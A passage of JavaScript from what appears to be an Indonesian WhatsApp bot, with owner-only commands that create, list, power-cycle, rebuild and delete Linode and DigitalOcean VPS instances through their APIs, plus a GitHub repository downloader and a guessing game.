      messageText += `IP Linode: ${ipAddress}\n`;
      messageText += `Password: ${linodeData.root_pass}\n`;

      await kyy.sendMessage(m.chat, { text: messageText });
    } else {
      throw new Error(`Gagal membuat Linode: ${responseData.errors[0].reason}`);
    }
  } catch (err) {
    console.error(err);
    reply(`Terjadi kesalahan saat membuat Linode: ${err}`);
  }
}
break;
            
            
 case "linode4gb": {
  if (!isCreator) return reply(`Khusus Kyy Saja Suki`);
  try {
    let linodeData = {
      label: `${args[0]}`,
      region: 'ap-south', // Ganti dengan region yang diinginkan
      type: 'g6-standard-2', // Spesifikasi 2GB RAM 1 Core CPU
      image: 'linode/ubuntu20.04', // Ganti dengan image yang diinginkan
      root_pass: generateRandomPassword(),
      stackscript_id: null,
      authorized_keys: null,
      backups_enabled: false
    };

    const response = await fetch('https://api.linode.com/v4/linode/instances', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${LINODE_API_TOKEN}`
      },
      body: JSON.stringify(linodeData)
    });

    const responseData = await response.json();

    if (response.ok) {
      const linodeId = responseData.id;

      // Menunggu hingga Linode selesai dibuat
      reply(`Tunggu Sebentar...`);
      await new Promise(resolve => setTimeout(resolve, 60000));

      // Mengambil informasi lengkap tentang Linode
      const linodeResponse = await fetch(`https://api.linode.com/v4/linode/instances/${linodeId}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${LINODE_API_TOKEN}`
        }
      });

      const linodeInfo = await linodeResponse.json();
      const ipAddress = linodeInfo.ipv4[0]; // Alamat IP Linode

      let messageText = `Linode berhasil dibuat!\n\n`;
      messageText += `ID: ${linodeId}\n`;
      messageText += `IP Linode: ${ipAddress}\n`;
      messageText += `Password: ${linodeData.root_pass}\n`;

      await kyy.sendMessage(m.chat, { text: messageText });
    } else {
      throw new Error(`Gagal membuat Linode: ${responseData.errors[0].reason}`);
    }
  } catch (err) {
    console.error(err);
    reply(`Terjadi kesalahan saat membuat Linode: ${err}`);
  }
}
break;

            
case "saldolinode":
  if (!isCreator) return reply(mess.owner);

  // Endpoint untuk mengambil informasi saldo promosi Linode
  const linodePromotionsEndpoint = 'https://api.linode.com/v4/profile';

  // Konfigurasi untuk melakukan permintaan ke API Linode
  const config = {
    headers: {
      'Authorization': `Bearer ${LINODE_API_TOKEN}`
    }
  };

  // Mengambil informasi saldo promosi dari Linode
  axios.get(linodePromotionsEndpoint, config)
    .then(response => {
      // Periksa apakah saldo promosi tersedia dalam respons
      if (response.data && Array.isArray(response.data.data)) {
        // Saldo promosi dapat ada dalam elemen pertama jika ada
        const saldoPromosi = response.data.data[0].balance;
        const teksSaldo = `Sisa Kredit Promosi Linode Dalam Akun Anda Adalah $${saldoPromosi}`;
        reply(teksSaldo);
      } else {
        reply('Informasi saldo promosi tidak ditemukan atau akun tidak memiliki saldo promosi.');
      }
    })
    .catch(error => {
      console.error(error);
      reply('Terjadi kesalahan saat mengambil informasi saldo promosi.');
    });

  break;




        
case "resetpassword": {
  if (!isCreator) return reply(`Khusus Kyy Saja Suki`);
  let linodeId = args[0];
  let newPassword = args[1];
  
  if (!linodeId || !newPassword) {
    return reply("Format: !resetpassword [Linode ID] [New Password]");
  }
  
  // Periksa apakah kata sandi memenuhi persyaratan keamanan yang diharapkan
  if (newPassword.length < 8) {
    return reply("Kata sandi harus memiliki setidaknya 8 karakter.");
  }
  
  try {
    const resetPassword = async () => {
      try {
        const response = await fetch(`https://api.linode.com/v4/linode/instances/${linodeId}/password`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'Authorization': `Bearer ${LINODE_API_TOKEN}`
          },
          body: JSON.stringify({ root_pass: newPassword })
        });
        
        if (response.ok) {
          reply(`Kata sandi VPS Linode ID ${linodeId} berhasil direset.`);
        } else {
          const responseData = await response.json();
          throw new Error(`Gagal mereset kata sandi VPS Linode: ${responseData.errors[0].reason}`);
        }
      } catch (error) {
        reply(`Terjadi kesalahan saat mereset kata sandi VPS Linode: ${error}`);
      }
    };
    
    resetPassword();
  } catch (err) {
    console.error(err);
    reply(`Terjadi kesalahan saat mereset kata sandi VPS Linode: ${err}`);
  }
}
break;



        
    case 'listlinode': {
  if (!isCreator) return reply("Anda bukan pemilik.");

  try {
    const getLinodes = async () => {
      try {
        const response = await fetch('https://api.linode.com/v4/linode/instances', {
          headers: {
            'Content-Type': 'application/json',
            'Authorization': `Bearer ${LINODE_API_TOKEN}`
          }
        });
        const data = await response.json();
        return data.data || [];
      } catch (error) {
        reply('Error fetching Linodes: ' + error);
        return [];
      }
    };

    getLinodes().then(linodes => {
      let totalvps = linodes.length;
      let message = `List VPS Linode Anda: ${totalvps}\n\n▬▭▬▭▬▭▬▭▬▭▬▭▬\n`;

      if (linodes.length === 0) {
        message += 'Tidak ada VPS yang tersedia.';
      } else {
        linodes.forEach(linode => {
          message += `- Linode Id: ${linode.id}\n- Label: ${linode.label}\n- Region: ${linode.region}\n- IP: ${linode.ipv4[0]}\n- Ram: ${linode.specs.memory / 1024} GB\n- Cpu: ${linode.specs.vcpus} CPU\n- Status: ${linode.status}\n- Harga: $\n▬▬▭▬▭▬▭▬▭▬▭▬\n`;
        });
      }
      kyy.sendMessage(m.chat, { text: message });
    });
  } catch (err) {
    reply('Terjadi kesalahan saat mengambil data Linode: ' + err);
  }

  break;
}
     
        
 case "offlinode": {
  if (!isCreator) return reply(`Sok Asik Anjg`);
  
  let linodeId = args[0];
  if (!linodeId) return reply('ID Linode belum diberikan.');

  async function turnOffLinode() {
    try {
      const response = await axios.post(
        `https://api.linode.com/v4/linode/instances/${linodeId}/shutdown`,
        {},
        {
          headers: {
            'Content-Type': 'application/json',
            'Authorization': `Bearer ${LINODE_API_TOKEN}`,
          },
        }
      );

      if (response.status === 200) {
        reply('VPS (Linode) sedang dimatikan...');
      } else {
        reply('Gagal mematikan VPS (Linode).');
      }
    } catch (error) {
      reply('Terjadi kesalahan saat mematikan VPS (Linode):', error.message);
    }
  }

  turnOffLinode();
  break;
}

case "onlinode": {
  if (!isCreator) return reply(`Sok Asik Anjg`);
  
  let linodeId = args[0];
  if (!linodeId) return reply('ID Linode belum diberikan.');

  async function turnOnLinode() {
    try {
      const response = await axios.post(
        `https://api.linode.com/v4/linode/instances/${linodeId}/boot`,
        {},
        {
          headers: {
            'Content-Type': 'application/json',
            'Authorization': `Bearer ${LINODE_API_TOKEN}`,
          },
        }
      );

      if (response.status === 200) {
        reply('VPS (Linode) sedang diaktifkan...');
      } else {
        reply('Gagal mengaktifkan VPS (Linode).');
      }
    } catch (error) {
      reply('Terjadi kesalahan saat mengaktifkan VPS (Linode):', error.message);
    }
  }

  turnOnLinode();
  break;
}
case "rebootlinode": {
  if (!isCreator) return reply(`Sok Asik Anjg`);
  
  let linodeId = args[0];
  if (!linodeId) return reply('ID Linode belum diberikan.');

  async function rebootLinode() {
    try {
      const response = await axios.post(
        `https://api.linode.com/v4/linode/instances/${linodeId}/reboot`,
        {},
        {
          headers: {
            'Content-Type': 'application/json',
            'Authorization': `Bearer ${LINODE_API_TOKEN}`,
          },
        }
      );

      if (response.status === 200) {
        reply('VPS (Linode) sedang direboot...');
      } else {
        reply('Gagal me-reboot VPS (Linode).');
      }
    } catch (error) {
      reply('Terjadi kesalahan saat me-reboot VPS (Linode):', error.message);
    }
  }

  rebootLinode();
  break;
}
//==================================================//
// DO
case "sisadroplet":{
if (!isCreator) return reply(`Ngapain Woi Tolol Yatim`)
async function getDropletInfo() {
  try {
    const accountResponse = await axios.get('https://api.digitalocean.com/v2/account', {
      headers: {
        Authorization: `Bearer ${API_TOKEN}`,
      },
    });

    const dropletsResponse = await axios.get('https://api.digitalocean.com/v2/droplets', {
      headers: {
        Authorization: `Bearer ${API_TOKEN}`,
      },
    });

    if (accountResponse.status === 200 && dropletsResponse.status === 200) {
      const dropletLimit = accountResponse.data.account.droplet_limit;
      const dropletsCount = dropletsResponse.data.droplets.length;
      const remainingDroplets = dropletLimit - dropletsCount;

      return {
        dropletLimit,
        remainingDroplets,
        totalDroplets: dropletsCount,
      };
    } else {
      throw new Error('Gagal mendapatkan data akun DigitalOcean atau droplet.');
    }
  } catch (error) {
    throw error;
  }
}

// Definisikan fungsi untuk mengeksekusi kasus "sisadroplet"
async function sisadropletHandler() {
  try {
    if (!isCreator) {
      return reply('Lu Siapanya Gua Anjg');
    }

    const dropletInfo = await getDropletInfo();
    reply(`*Sisa Droplet Yang Dapat Anda Pakai: ${dropletInfo.remainingDroplets}*

*Total Droplet Yang Sudah Terpakai: ${dropletInfo.totalDroplets}*`);
  } catch (error) {
    reply(`Terjadi kesalahan: ${error.message}`);
  }
}

  sisadropletHandler();
  break;
}
case "restartvps": {
    if (!isCreator) return reply(`Idih Yatim So Asik Kontol`)
  let dropletId = args[0];
  if (!dropletId) return reply('ID droplet belum diberikan.');

  // Fungsi untuk melakukan restart VPS berdasarkan ID droplet
  const restartVPS = async (dropletId) => {
    try {
      const apiUrl = `https://api.digitalocean.com/v2/droplets/${dropletId}/actions`;

      const response = await fetch(apiUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${API_TOKEN}`
        },
        body: JSON.stringify({
          type: 'reboot'
        })
      });

      if (response.ok) {
        const data = await response.json();
        return data.action;
      } else {
        const errorData = await response.json();
        reply(`Gagal melakukan restart VPS: ${errorData.message}`);
      }
    } catch (error) {
      reply('Terjadi kesalahan saat melakukan restart VPS:', error.message);
      reply('Terjadi kesalahan saat melakukan restart VPS.');
    }
  };

  restartVPS(dropletId)
    .then((action) => {
      reply(`Aksi restart VPS berhasil dimulai. Status aksi: ${action.status}`);
    })
    .catch((err) => {
      reply(err);
    });

  break;
}
case "turnoff": {
  if (!isCreator) return reply(`Yatim Kontol Rese`);
  
  let dropletId = args[0];
  if (!dropletId) return reply('ID droplet belum diberikan.');

  async function turnOffDroplet() {
    try {
      const response = await axios.post(
        `https://api.digitalocean.com/v2/droplets/${dropletId}/actions`,
        {
          type: 'power_off',
        },
        {
          headers: {
            'Content-Type': 'application/json',
            Authorization: `Bearer ${API_TOKEN}`,
          },
        }
      );

      if (response.status === 201 && response.data.action && response.data.action.status === 'in-progress') {
        reply('VPS (Droplet) sedang dimatikan...');
      } else {
        reply('Gagal mematikan VPS (Droplet).');
      }
    } catch (error) {
      reply('Terjadi kesalahan saat mematikan VPS (Droplet):', error.message);
    }
  }

  turnOffDroplet();
  break;
}

        
case "turnon": {
  if (!isCreator) return reply(`Sok Asik Anjg`);
  
  let dropletId = args[0];
  if (!dropletId) return reply('ID droplet belum diberikan.');

  async function turnOnDroplet() {
    try {
      const response = await axios.post(
        `https://api.digitalocean.com/v2/droplets/${dropletId}/actions`,
        {
          type: 'power_on',
        },
        {
          headers: {
            'Content-Type': 'application/json',
            Authorization: `Bearer ${API_TOKEN}`,
          },
        }
      );

      if (response.status === 201 && response.data.action && response.data.action.status === 'in-progress') {
        reply('VPS (Droplet) sedang dihidupkan...');
      } else {
        reply('Gagal menghidupkan VPS (Droplet).');
      }
    } catch (error) {
      reply('Terjadi kesalahan saat menghidupkan VPS (Droplet):', error.message);
    }
  }

  turnOnDroplet();
  break;
}
        
        
case "rebuild": {
  if (!isCreator) return reply(`Lu Siapanya Gua Anjg Gausah Nyuruh Nyuruh Gua Yatim`);

  let dropletId = args[0];
  if (!dropletId) return reply('ID droplet belum diberikan.');

  let rebuildVPS = async () => {
    try {
      // Rebuild droplet menggunakan API DigitalOcean
      const response = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}/actions`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${API_TOKEN}`
        },
        body: JSON.stringify({
          type: 'rebuild',
          image: 'ubuntu-20-04-x64' // Ganti dengan slug image yang ingin digunakan untuk rebuild (misal: 'ubuntu-18-04-x64')
        })
      });

      if (response.ok) {
        const data = await response.json();
        reply('Rebuild VPS berhasil dimulai. Status aksi:', data.action.status);

        // Mendapatkan informasi VPS setelah rebuild
        const vpsInfo = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
          method: 'GET',
          headers: {
            'Content-Type': 'application/json',
            'Authorization': `Bearer ${API_TOKEN}`
          }
        });

        if (vpsInfo.ok) {
          const vpsData = await vpsInfo.json();
          const droplet = vpsData.droplet;
          const ipv4Addresses = droplet.networks.v4.filter(network => network.type === 'public');
          const ipAddress = ipv4Addresses.length > 0 ? ipv4Addresses[0].ip_address : 'Tidak ada IP';

          const textvps = `*VPS SUKSES REBUILD*\nIP VPS: ${ipAddress}\nSYSTEM IMAGE: ${droplet.image.slug}`;
          await sleep(60000) 
 kyy.sendMessage(m.chat, { text: textvps });
        } else {
          reply('Gagal mendapatkan informasi VPS setelah rebuild.');
        }
      } else {
        const errorData = await response.json();
        reply('Gagal melakukan rebuild VPS:', errorData.message);
      }
    } catch (error) {
      reply('Terjadi kesalahan saat melakukan rebuild VPS:', error);
    }
  };

  rebuildVPS();
}
break;

        case "deldroplet": {
  if (!isCreator) return reply('Maaf, command ini hanya untuk pemilik.');

  let dropletId = args[0];
  if (!dropletId) return reply('ID droplet belum diberikan.');

  let deleteDroplet = async () => {
    try {
      let response = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
        method: 'DELETE',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${API_TOKEN}`
        }
      });

      if (response.ok) {
        reply('Droplet berhasil dihapus.');
      } else {
        const errorData = await response.json();
        throw new Error(`Gagal menghapus droplet: ${errorData.message}`);
      }
    } catch (error) {
      console.error('Terjadi kesalahan saat menghapus droplet:', error);
      reply('Terjadi kesalahan saat menghapus droplet.');
    }
  };

  deleteDroplet();

  break;
}
case "listdroplet": {
  if (!isCreator) return reply("Anda bukan pemilik.");

  try {
    const getDroplets = async () => {
      try {
        const response = await fetch('https://api.digitalocean.com/v2/droplets', {
          headers: {
            Authorization: "Bearer " + API_TOKEN
          }
        });
        const data = await response.json();
        return data.droplets || [];
      } catch (error) {
        reply('Error fetching droplets: ' + error);
        return [];
      }
    };

    getDroplets().then(droplets => {
      let totalvps = droplets.length;
      let mesej = `List Droplet Digital Ocean Anda: ${totalvps}\n\n▬▭▬▭▬▭▬▭▬▭▬▭▬\n`;

      if (droplets.length === 0) {
        mesej += 'Tidak ada Droplet yang tersedia.';
      } else {
        droplets.forEach(droplet => {
          const ipv4Addresses = droplet.networks.v4.filter(network => network.type === "public");
          const ipAddress = ipv4Addresses.length > 0 ? ipv4Addresses[0].ip_address : 'Tidak ada IP';
          mesej += `- Droplet Id: ${droplet.id}\n- Hostname: ${droplet.name}\n- Username Login: root\n- IP: ${ipAddress}\n- Ram: ${droplet.memory} MB\n- Cpu: ${droplet.vcpus} CPU\n- OS: ${droplet.image.distribution}\n- Storage: ${droplet.disk} GB\n- Status: ${droplet.status}\n▬▭▬▭▬▭▬▭▬▭▬▭▬\n`;
        });
      }
      kyy.sendMessage(m.chat, { text: mesej });
    });
  } catch (err) {
    reply('Terjadi kesalahan saat mengambil data droplet: ' + err);
  }

  break;
}
    
 case "cekdroplet": {
  if (!isCreator) return reply(`Ngapain? Kepo Amat Dah`);

  let dropletId = args[0];
  if (!dropletId) return reply('ID droplet belum diberikan.');

  // Mendapatkan informasi droplet (VPS) berdasarkan ID
  const getDropletInfo = async (dropletId) => {
    try {
      const apiUrl = `https://api.digitalocean.com/v2/droplets/${dropletId}`;
      const response = await fetch(apiUrl, {
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${API_TOKEN}`
        }
      });

      if (response.ok) {
        const data = await response.json();
        const droplet = data.droplet;
        const ipv4Addresses = droplet.networks.v4.filter(network => network.type === 'public');
        const ipAddress = ipv4Addresses.length > 0 ? ipv4Addresses[0].ip_address : 'Tidak ada IP';
        const vpsRam = droplet.memory / 1024;

        return {
          dropletid: droplet.id,
          username: droplet.name,
          ip: ipAddress,
          ram: `${vpsRam} GB`,
          os: droplet.image.distribution,
          cpu: droplet.vcpus > 1 ? `${droplet.vcpus} vCPU` : `${droplet.vcpus} vCPUs`,
          storage: droplet.disk,
          status: droplet.status // Menambahkan status VPS
        };
      } else {
        const errorData = await response.json();
        throw new Error(`Gagal memeriksa detail droplet: ${errorData.message}`);
      }
    } catch (error) {
      reply('Terjadi kesalahan saat memeriksa detail droplet:', error.message);
      throw new Error('Terjadi kesalahan saat memeriksa detail droplet.');
    }
  };

  getDropletInfo(dropletId)
    .then((info) => {
      let textku = `*DETAIL VPS ANDA*\nDroplet Id: ${info.dropletid}\nHostname: ${info.username}\nIpv4 : ${info.ip}\nRam : ${info.ram}\nOS : ${info.os}\nCPU: ${info.cpu}\nStorage: ${info.storage}\nStatus : ${info.status}`;
      kyy.sendMessage(m.chat, { text: textku });
    })
    .catch((err) => {
      reply(err);
      kyy.sendMessage(m.chat, { text: 'Terjadi kesalahan saat memeriksa detail VPS.' });
    });

  break;
}
       
        
    case "vps1g1c": {
  if (!isCreator) return reply(`Khusus Kyy Saja Suki`);
    let hostname = args[0];
  if (!hostname) return reply('Masukan Hostname Vps.');

  try {
    let dropletData = {
      name: hostname,
      region: 'sgp1',
      size: 's-1vcpu-1gb',
      image: 'ubuntu-20-04-x64',
      ssh_keys: null,
      backups: false,
      ipv6: true,
      user_data: null,
      private_networking: null,
      volumes: null,
      tags: ['T']
    };

    let password = generateRandomPassword();
    dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

    let response = await fetch('https://api.digitalocean.com/v2/droplets', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': "Bearer " + API_TOKEN
      },
      body: JSON.stringify(dropletData)
    });

    let responseData = await response.json();

    if (response.ok) {
      let dropletConfig = responseData.droplet;
      let dropletId = dropletConfig.id;

      // Menunggu hingga VPS selesai dibuat
      reply(`Tunggu Sebentar...`);
      await new Promise(resolve => setTimeout(resolve, 60000));

      // Mengambil informasi lengkap tentang VPS
      let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': "Bearer " + API_TOKEN
        }
      });

      let dropletData = await dropletResponse.json();
      // Memeriksa apakah ada alamat IP VPS yang tersedia
      let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 ? dropletData.droplet.networks.v4[0].ip_address : "Tidak ada alamat IP yang tersedia";

      let messageText = `VPS berhasil dibuat!\n\n`;

      messageText += `ID: ${dropletId}\n`;
      messageText += `IP VPS: ${ipVPS}\n`;
      messageText += `Password: ${password}\n`;

      await kyy.sendMessage(m.chat, { text: messageText });
    } else {
      throw new Error(`Gagal membuat VPS: ${responseData.message}`);
    }
  } catch (err) {
    console.error(err);
    reply(`Terjadi kesalahan saat membuat VPS: ${err}`);
  }}
break

    case "vps2g1c": {
  if (!isCreator) return reply(`Khusus Kyy Saja Suki`);
    let hostname = args[0];
  if (!hostname) return reply('Masukan Hostname Vps.');

  try {
    let dropletData = {
      name: hostname,
      region: 'sgp1',
      size: 's-1vcpu-2gb',
      image: 'ubuntu-20-04-x64',
      ssh_keys: null,
      backups: false,
      ipv6: true,
      user_data: null,
      private_networking: null,
      volumes: null,
      tags: ['T']
    };

    let password = generateRandomPassword();
    dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

    let response = await fetch('https://api.digitalocean.com/v2/droplets', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': "Bearer " + API_TOKEN
      },
      body: JSON.stringify(dropletData)
    });

    let responseData = await response.json();

    if (response.ok) {
      let dropletConfig = responseData.droplet;
      let dropletId = dropletConfig.id;

      // Menunggu hingga VPS selesai dibuat
      reply(`Tunggu Sebentar...`);
      await new Promise(resolve => setTimeout(resolve, 60000));

      // Mengambil informasi lengkap tentang VPS
      let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': "Bearer " + API_TOKEN
        }
      });

      let dropletData = await dropletResponse.json();
      // Memeriksa apakah ada alamat IP VPS yang tersedia
      let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 ? dropletData.droplet.networks.v4[0].ip_address : "Tidak ada alamat IP yang tersedia";

      let messageText = `VPS berhasil dibuat!\n\n`;

      messageText += `ID: ${dropletId}\n`;
      messageText += `IP VPS: ${ipVPS}\n`;
      messageText += `Password: ${password}\n`;

      await kyy.sendMessage(m.chat, { text: messageText });
    } else {
      throw new Error(`Gagal membuat VPS: ${responseData.message}`);
    }
  } catch (err) {
    console.error(err);
    reply(`Terjadi kesalahan saat membuat VPS: ${err}`);
  }}
break  
 
    case "vps2g2c": {
  if (!isCreator) return reply(`Khusus Kyy Saja Suki`);
    let hostname = args[0];
  if (!hostname) return reply('Masukan Hostname Vps.');

  try {
    let dropletData = {
      name: hostname,
      region: 'sgp1',
      size: 's-2vcpu-2gb',
      image: 'ubuntu-20-04-x64',
      ssh_keys: null,
      backups: false,
      ipv6: true,
      user_data: null,
      private_networking: null,
      volumes: null,
      tags: ['T']
    };

    let password = generateRandomPassword();
    dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

    let response = await fetch('https://api.digitalocean.com/v2/droplets', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': "Bearer " + API_TOKEN
      },
      body: JSON.stringify(dropletData)
    });

    let responseData = await response.json();

    if (response.ok) {
      let dropletConfig = responseData.droplet;
      let dropletId = dropletConfig.id;

      // Menunggu hingga VPS selesai dibuat
      reply(`Tunggu Sebentar...`);
      await new Promise(resolve => setTimeout(resolve, 60000));

      // Mengambil informasi lengkap tentang VPS
      let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': "Bearer " + API_TOKEN
        }
      });

      let dropletData = await dropletResponse.json();
      // Memeriksa apakah ada alamat IP VPS yang tersedia
      let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 ? dropletData.droplet.networks.v4[0].ip_address : "Tidak ada alamat IP yang tersedia";

      let messageText = `VPS berhasil dibuat!\n\n`;

      messageText += `ID: ${dropletId}\n`;
      messageText += `IP VPS: ${ipVPS}\n`;
      messageText += `Password: ${password}\n`;

      await kyy.sendMessage(m.chat, { text: messageText });
    } else {
      throw new Error(`Gagal membuat VPS: ${responseData.message}`);
    }
  } catch (err) {
    console.error(err);
    reply(`Terjadi kesalahan saat membuat VPS: ${err}`);
  }}
break      
    case "vps4g2c": {
  if (!isCreator) return reply(`Khusus Kyy Saja Suki`);
    let hostname = args[0];
  if (!hostname) return reply('Masukan Hostname Vps.');

  try {
    let dropletData = {
      name: hostname,
      region: 'sgp1',
      size: 's-2vcpu-4gb',
      image: 'ubuntu-20-04-x64',
      ssh_keys: null,
      backups: false,
      ipv6: true,
      user_data: null,
      private_networking: null,
      volumes: null,
      tags: ['T']
    };

    let password = generateRandomPassword();
    dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

    let response = await fetch('https://api.digitalocean.com/v2/droplets', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': "Bearer " + API_TOKEN
      },
      body: JSON.stringify(dropletData)
    });

    let responseData = await response.json();

    if (response.ok) {
      let dropletConfig = responseData.droplet;
      let dropletId = dropletConfig.id;

      // Menunggu hingga VPS selesai dibuat
      reply(`Tunggu Sebentar...`);
      await new Promise(resolve => setTimeout(resolve, 60000));

      // Mengambil informasi lengkap tentang VPS
      let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': "Bearer " + API_TOKEN
        }
      });

      let dropletData = await dropletResponse.json();
      // Memeriksa apakah ada alamat IP VPS yang tersedia
      let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 ? dropletData.droplet.networks.v4[0].ip_address : "Tidak ada alamat IP yang tersedia";

      let messageText = `VPS berhasil dibuat!\n\n`;

      messageText += `ID: ${dropletId}\n`;
      messageText += `IP VPS: ${ipVPS}\n`;
      messageText += `Password: ${password}\n`;

      await kyy.sendMessage(m.chat, { text: messageText });
    } else {
      throw new Error(`Gagal membuat VPS: ${responseData.message}`);
    }
  } catch (err) {
    console.error(err);
    reply(`Terjadi kesalahan saat membuat VPS: ${err}`);
  }}
break        
     case "vps8g4c": {
  if (!isCreator) return reply(`Khusus Kyy Saja Suki`);
    let hostname = args[0];
  if (!hostname) return reply('Masukan Hostname Vps.');

  try {
    let dropletData = {
      name: hostname,
      region: 'sgp1',
      size: 's-4vcpu-8gb',
      image: 'ubuntu-20-04-x64',
      ssh_keys: null,
      backups: false,
      ipv6: true,
      user_data: null,
      private_networking: null,
      volumes: null,
      tags: ['T']
    };

    let password = generateRandomPassword();
    dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

    let response = await fetch('https://api.digitalocean.com/v2/droplets', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': "Bearer " + API_TOKEN
      },
      body: JSON.stringify(dropletData)
    });

    let responseData = await response.json();

    if (response.ok) {
      let dropletConfig = responseData.droplet;
      let dropletId = dropletConfig.id;

      // Menunggu hingga VPS selesai dibuat
      reply(`Tunggu Sebentar...`);
      await new Promise(resolve => setTimeout(resolve, 60000));

      // Mengambil informasi lengkap tentang VPS
      let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': "Bearer " + API_TOKEN
        }
      });

      let dropletData = await dropletResponse.json();
      // Memeriksa apakah ada alamat IP VPS yang tersedia
      let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 ? dropletData.droplet.networks.v4[0].ip_address : "Tidak ada alamat IP yang tersedia";

      let messageText = `VPS berhasil dibuat!\n\n`;

      messageText += `ID: ${dropletId}\n`;
      messageText += `IP VPS: ${ipVPS}\n`;
      messageText += `Password: ${password}\n`;

      await kyy.sendMessage(m.chat, { text: messageText });
    } else {
      throw new Error(`Gagal membuat VPS: ${responseData.message}`);
    }
  } catch (err) {
    console.error(err);
    reply(`Terjadi kesalahan saat membuat VPS: ${err}`);
  }}
break
case 'svps': case 'sendvps': {
		 if (!isCreator) return (`Ngapain Pea`)
          if (!text) return reply(`Example : ${prefix + command} 6285xxxxx,ip,ram,harga,passwordvps`)
            reply('Pesanan Telah Sukses Dikirim') 
            var mon = args.join(' ')
            var m1 = mon.split(",")[0]
            var m2 = mon.split(",")[1]
            var m3 = mon.split(",")[2]
            var m4 = mon.split(",")[3]
            var m5 = mon.split(",")[4]
                    let mq1 = m1 + '@s.whatsapp.net'
                  let ownernya = owner + '@s.whatsapp.net'
               let me = m.sender
               let ments = [mq1, ownernya, me]
kyy.sendMessage(mq1, {text:`*───❖》Kyy Offcial《❖───*\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n*📦 Pesananmu Datang 📦*\n*Harga : ${m4}*\n*Hari : ${hariini}*\n*Tanggal : ${tanggal2}*\n*Jam : ${time}*\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n*[+] Ip : ${m2}*\n*[+] Username : root*\n*[+] Password : ${m5}*\n*[+] Ram : ${m3}*\n\n*───《TOS VPS》───*\n\n*-JANGAN SAMPAI TERKENA DDOS*\n*-JANGAN GUNAKAN UNTUK DDOS*\n*-JANGAN GUNAKAN UNTUK MINING*\n*-CPU JANGAN SAMPAI 100%*\n*-MELANGGAR RULES? GARANSI ANGUS*\n*-PANEL SUS NO REFF*`}, m) 
                 }
            break   
case 'git': case 'gitclone':
if (!isPrem && global.db.data.users[sender].limit < 3) return reply('Maaf Kak Limit Anda Habis')
             db.data.users[sender].limit -= 3 // -1 limit
                reply('Limit Anda Terpakai 3')
if (!args[0]) return m.reply(`Link Nya Mana Kak?\nContoh :\n${prefix}${command} Link Github`)
if (!isUrl(args[0]) && !args[0].includes('github.com')) return m.reply(`Link invalid!!`)
let regex1 = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
    let [, user, repo] = args[0].match(regex1) || []
    repo = repo.replace(/.git$/, '')
    let url = `https://api.github.com/repos/${user}/${repo}/zipball`
    let filename = (await fetch(url, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
    kyy.sendMessage(m.chat, { document: { url: url }, fileName: filename+'.zip', mimetype: 'application/zip' }, { quoted: m }).catch((err) =>(mess.error))
break
//=================================================//
case 'tebak': {
if (!isPrem && global.db.data.users[sender].limit < 3) return reply('Maaf Kak Limit Anda Habis')
             db.data.users[sender].limit -= 3 // -1 limit
                reply('Limit Anda Terpakai 3')
if (isBan) return m.reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
 if (!text) throw `Example : ${prefix + command} lagu\n\nOption : \n1. lagu\n2. gambar\n3. kata\n4. kalimat\n5. lirik\n6.lontong`
 if (args[0] === "lagu") {
 if (tebaklagu.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
 let anu = await JSON.parse(fs.readFileSync('./database/Games/tebaklagu.json'));
 let result = anu[Math.floor(Math.random() * anu.length)]
 let msg = await kyy.sendMessage(from, { audio: { url: result.link_song }, mimetype: 'audio/mpeg' }, {quoted:m})
 kyy.sendText(from, `Lagu Tersebut Adalah Lagu dari?\n\nArtist : ${result.artist}\nWaktu : 60s`, msg).then(() => {
